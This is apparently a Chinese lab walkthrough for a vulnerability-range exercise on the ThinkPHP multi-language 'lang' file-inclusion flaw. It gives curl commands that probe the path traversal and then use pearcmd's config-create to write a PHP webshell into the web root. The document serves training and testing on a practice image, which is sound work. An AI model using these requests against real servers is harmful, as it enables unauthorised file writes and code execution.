# 113｜ThinkPHP 多语言 lang 文件包含至 pearcmd 写文件

- 镜像：`vulfocus/thinkphp:6.0.12`（NOSEC/Vulfocus 同题环境）
- 题库端口：`80`
- 无 CVE 编号。公开资料对应 ThinkPHP 多语言 LFI（6.0.13 及以前；5.0.x/5.1.x 在开启多语言时同样受影响）。[S1][S2]

## 一句话打法

多语言开启时，`lang`（或 Header `think-lang` / Cookie `think_lang`）可 `../` 包含本地 PHP。再包含 `pearcmd.php` 的 `config-create` 往 Web 目录写文件。[S1][S3]

## 操作步骤

1. 探测 LFI：包含应用自己的 `index`（无 `.php` 后缀）。存在漏洞时常见 500：[S1]

   ```powershell
   curl.exe -i "http://<靶场IP>/?lang=../../../../../public/index"
   ```

2. 在 `register_argc_argv` 开启且存在 pear 的环境（官方 PHP Docker/多数靶场满足）写入 webshell。Query 里的 `+config-create` 与写路径是 **pearcmd 的 argv**，必须保留： [S1][S3]

   ```powershell
   curl.exe -i "http://<靶场IP>/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"
   ```

3. 成功信号：响应出现 pearcmd 的 CLI 输出，随后访问 `/shell.php` 得到 `phpinfo`。Cookie 探测时先设 `think_lang=zh-cn` 以免覆盖 GET。[S1][S2]

## 本题特有排坑

- 多语言**默认关闭**；题库/Vulfocus 镜像已开启，自建环境没开则步骤 1 不会 500。[S1][S2]
- 只能包含 `.php`；没有 pear/`register_argc_argv` 就停在 LFI，不要编造任意文件读取。[S1][S4]
- `lang` 不要带 `.php` 后缀（框架会自己加）。pearcmd 路径按容器常见 `/usr/local/lib/php/pearcmd`。[S1]

## 来源

- [S1] Vulhub thinkphp/lang-rce README。详见[来源清单](../sources/113_thinkphp_lang/_meta.md)。
- [S2] NOSEC 通报（含 Vulfocus 镜像）。详见[来源清单](../sources/113_thinkphp_lang/_meta.md)。
- [S3] pearcmd 写文件原理。详见[来源清单](../sources/113_thinkphp_lang/_meta.md)。
- [S4] 上游修复 commit。详见[来源清单](../sources/113_thinkphp_lang/_meta.md)。
